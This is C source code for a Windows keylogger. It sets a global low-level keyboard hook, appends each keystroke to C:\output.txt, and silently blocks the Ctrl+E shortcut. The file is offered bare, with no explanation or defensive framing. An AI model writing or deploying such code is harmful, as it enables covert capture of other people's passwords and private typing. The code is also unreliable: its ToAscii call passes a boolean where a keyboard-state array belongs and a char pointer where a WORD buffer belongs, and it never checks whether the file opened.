#include <stdio.h>
#include <windows.h>
#include <winuser.h>

HHOOK keyboard_hook;

LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
if (nCode >= 0 && wParam == WM_KEYDOWN) {
KBDLLHOOKSTRUCT *kbhs = (KBDLLHOOKSTRUCT *) lParam;

    if (kbhs->vkCode == 0x45 && GetAsyncKeyState(VK_CONTROL) < 0) {
        return 1;
    }

    if (kbhs->vkCode != 0 && kbhs->vkCode != VK_BACK && kbhs->vkCode != VK_RETURN) {
        char chr;
        ToAscii(kbhs->vkCode, kbhs->scanCode, GetKeyState(VK_SHIFT) < 0, &chr, 0);
        FILE *output_file = fopen("C:\\output.txt", "a");
        fprintf(output_file, "%c", chr);
        fclose(output_file);
    }
}

return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);

}

int main() {
keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_callback, NULL, 0);

MSG message;
while (GetMessage(&message, NULL, 0, 0)) {
    TranslateMessage(&message);
    DispatchMessage(&message);
}

UnhookWindowsHookEx(keyboard_hook);

return 0;
}